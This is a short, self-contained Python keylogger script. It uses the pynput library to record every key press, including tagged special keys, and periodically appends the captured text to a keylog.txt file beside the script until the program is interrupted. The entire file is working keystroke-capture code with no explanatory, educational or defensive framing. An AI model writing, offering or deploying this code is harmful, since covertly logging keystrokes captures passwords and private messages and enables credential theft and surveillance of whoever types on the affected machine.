import os
from pynput import keyboard
import time

class Keylogger:
    def __init__(self):
        self.log = ""
        self.log_file = os.path.join(os.path.dirname(__file__), "keylog.txt")
        
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            special_keys = {
                keyboard.Key.enter: '[ENTER]',
                keyboard.Key.space: ' ',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.backspace: '[BACK]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl_l: '[CTRL]',
                keyboard.Key.ctrl_r: '[CTRL]',
                keyboard.Key.alt_l: '[ALT]',
                keyboard.Key.alt_r: '[ALT]',
                keyboard.Key.caps_lock: '[CAPS]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.left: '[LEFT]',
                keyboard.Key.right: '[RIGHT]',
                keyboard.Key.up: '[UP]',
                keyboard.Key.down: '[DOWN]',
                keyboard.Key.home: '[HOME]',
                keyboard.Key.end: '[END]',
                keyboard.Key.page_up: '[PGUP]',
                keyboard.Key.page_down: '[PGDN]',
            }
            current_key = special_keys.get(key, f'[{str(key)}]')
        
        self.log += current_key
        
        if len(self.log) >= 100:
            self.save_log()
    
    def save_log(self):
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""
    
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.start()
        
        try:
            while True:
                time.sleep(10)
                if self.log:
                    self.save_log()
        except KeyboardInterrupt:
            self.save_log()
            keyboard_listener.stop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()